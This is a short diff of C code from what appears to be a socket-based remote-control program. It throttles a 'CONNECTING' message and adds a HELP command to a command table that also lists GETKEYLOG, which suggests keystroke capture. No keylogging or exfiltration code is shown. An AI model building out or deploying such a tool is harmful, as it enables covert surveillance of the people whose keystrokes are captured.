@@ -380,6 +380,7 @@ void * getMessageController (void * vParam){
 
 
 	char buffer3[256] = {0};
+	int i = 0;
 	while(1){
 		if((param)->socketStatus == 's' || (param)->socketStatus == 'c'){
 		pass = read((param)->clientSocket, buffer, 1024 - 1);
@@ -431,7 +432,10 @@ void * getMessageController (void * vParam){
 				(param)->socketStatus = 'x';
 			}else return NULL;
 		}
-		}else printf("CONNECTING\n");
+		}else i++;
+
+		if (i == 100){i=0; printf("CONNECTING\n");	}
+
 
 		usleep(10000);
 	}
@@ -512,6 +516,7 @@ DWORD WINAPI execMessage(LPVOID paramTh){
 	addCommand("EXIT", (void *)EXIT, normalCommandPack);
 	addCommand("HALLO", (void *)HALLO, normalCommandPack);
 	addCommand("GETKEYLOG", (void *)GETKEYLOG, normalCommandPack);
+	addCommand("HELP", (void *)HELP, normalCommandPack);
 
 	unsigned char SURFMODE = 0;
 	FILE * fp = NULL;
